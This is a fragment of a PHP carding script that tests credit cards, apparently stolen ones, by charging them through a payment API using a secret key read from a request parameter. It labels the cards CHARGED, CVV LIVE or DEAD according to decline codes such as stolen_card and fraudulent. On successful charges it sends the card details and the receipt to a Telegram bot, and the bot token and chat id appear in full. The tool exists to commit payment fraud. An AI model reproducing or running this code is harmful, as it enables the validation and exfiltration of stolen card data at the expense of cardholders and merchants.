...
$sk_file = file("./https.skvalidaddedbyrakhi.txt");
$get_sk = end($sk_file);
$skk = trim($get_sk);
$sk = $_GET['sec'];
//fwrite("hhtfahljah.txt", $sk + '/n');
...
break;  
    ...
    if ($cvc_check !== "pass" && $receipturl !== ""){
        ...
        echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' CCN Charged By TKKYTRS😈 ✅<br>Bypassed: '.$x.'<br>Cvc: '.$cvc_check.' <br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>';
         $url = "https://api.telegram.org/bot6461548116:AAG4GNbpk9mFq1DIyfqOcUAcORVGKpFk3GI/sendMessage?chat_id=-635459207&text=CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' CCN Charged ✅<br>Bypassed: '.$x.'<br>Cvc: '.$cvc_check.' <br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>";
    $ch = curl_init();
    ...
    
    {
        ...
        echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' Charged By TKKYTRS😈 ✅<br>Bypassed: '.$x.'<br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>';
             $url = "https://api.telegram.org/bot6461548116:AAG4GNbpk9mFq1DIyfqOcUAcORVGKpFk3GI/sendMessage?chat_id=-635459207&text=CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' CCN Charged ✅<br>Bypassed: '.$x.'<br>Cvc: '.$cvc_check.' <br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>";
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    ...
    {
        echo '|𝘾𝙑𝙑</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVV LIVE By TKKYTRS😈<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, "generic_decline"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC DECLINED<br>Bypassed: '.$x.'</span><br>'.$cvc_check.'';
    }
    ...
    {
        echo '|𝘾𝘾𝙉</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INSUFFICIENT FUNDS<br>Bypassed: '.$x.'</span><br>cvc - '.$cvc_check.'';
    }

    elseif (strpos($result2, "fraudulent"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT<br>Bypassed: '.$x.'</span><br>cvc - '.$cvc_check.'';
    }
    elseif (strpos($resul3, "do_not_honor"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR <br>Bypassed: '.$x.'</span><br>';
    }
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT <br>Bypassed: '.$x.'</span><br>';

    }

    elseif (strpos($result2, '"code": "incorrect_cvc"'))
    {
        echo '|𝘾𝙑𝙑</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect <br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, ' "code": "invalid_cvc"'))
    {
        echo '|𝘾𝘾𝙉</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect <br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, "invalid_expiry_month"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INVAILD EXPIRY MONTH <br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result2, "invalid_account"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INVAILD ACCOUNT<br>Bypassed: '.$x.'</span><br>';
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: LOST CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "lost_card"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY Manish</span> <br>';
    }

    elseif (strpos($result2, "stolen_card"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: STOLEN CARD<br>Bypassed: '.$x.'</span><br>';
    }
    ...
    {
        echo '|𝘾𝘾𝙉</span>  </span>CC:  ' . $lista . '</span>  <br>Result: TRANSACTION NOT ALLOWED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "authentication_required"))
    {
        echo '|𝘾𝘾𝙉</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED<br>Bypassed: '.$x.'</span><br>';
    }
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PICKUP CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "pickup_card"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PICKUP CARD<br>Bypassed: '.$x.'</span><br>';
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: EXPIRED CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, 'Your card has expired.'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: EXPIRED CARD<br>Bypassed: '.$x.'</span><br>';
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Card Rate Limited<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"code": "processing_error"'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PROCESSING ERROR<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, ' "message": "Your card number is incorrect."'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"decline_code": "service_not_allowed"'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SERVICE NOT ALLOWED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"code": "processing_error"'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PROCESSING ERROR<br>Bypassed: '.$x.'</span><br>';
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INCORRECT CARD NUMBER<br>Bypassed: '.$x.'</span><br>';
    }
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD DECLINED<br>Bypassed: '.$x.'</span><br>';
    ...
    elseif (strpos($result2, "generic_decline"))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC CARD<br>Bypassed: '.$x.'</span><br>';
    }
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_UNCHECKED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "fail"'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECK : FAIL<br>Bypassed: '.$x.'</span><br>';
    }
    ...
    elseif (strpos($result2, '"cvc_check": "unchecked"'))
    {
        echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "fail"'))
    {
    ...
    // {
    //     echo '|𝘿𝙀𝘼𝘿</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK RATE LIMIT</span><br>';
    // }
    ...
    {
        echo '|𝘿𝙀𝘼𝘿</span> CC:  ' . $lista . '</span>  <br>Result: ' . $result2 . ' <br><br><br>Result: ' . $result2 . '</span><br>';
